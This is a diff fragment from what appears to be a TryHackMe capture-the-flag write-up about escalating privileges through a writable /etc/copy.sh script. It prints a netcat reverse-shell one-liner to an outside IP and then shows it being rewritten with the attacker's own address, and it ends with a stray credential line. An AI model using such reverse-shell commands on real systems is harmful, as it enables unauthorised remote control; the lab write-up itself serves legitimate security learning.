@@ -223,10 +223,23 @@ www-data@THM-Chal:/home/itguy$ cat backup.pl
 system("sh", "/etc/copy.sh");
 www-data@THM-Chal:/home/itguy$ 
 
+```
+
+cat into copy.sh we can see the following code:
+
+```
+www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
+www-data@THM-Chal:/home/itguy$ 
 
 ```
 
+Since there is a reverse_shell setup already, we can just edit the IP and port, and echo to copy.sh (since we cannot use vim or nano, no privileges)
 
+```
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.73.167 5554 >/tmp/f" > /etc/copy.sh
+
+```
 
 
 admin: manager
